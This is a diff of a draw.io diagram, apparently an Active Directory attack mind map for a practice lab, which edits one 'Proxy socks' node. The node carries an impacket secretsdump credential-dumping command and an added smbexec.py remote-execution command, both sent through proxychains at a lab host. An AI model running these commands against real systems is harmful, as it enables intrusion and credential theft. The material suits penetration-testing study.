@@ -436,7 +436,7 @@
             <mxGeometry height="40" width="150" x="1896" y="1011" as="geometry" />
           </mxCell>
         </object>
-        <object label="&lt;div&gt;Proxy socks&lt;/div&gt;" cmd="proxychains secretsdump -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39;" id="gim2rbIdz-NWKrZqOkX9-6">
+        <object label="&lt;div&gt;Proxy socks&lt;/div&gt;" exec_cmd="proxychains smbexec.py -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39; -debug" dump_creds="proxychains secretsdump -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39;" id="gim2rbIdz-NWKrZqOkX9-6">
           <mxCell parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" vertex="1">
             <mxGeometry height="57" width="156" x="1540" y="620" as="geometry" />
           </mxCell>
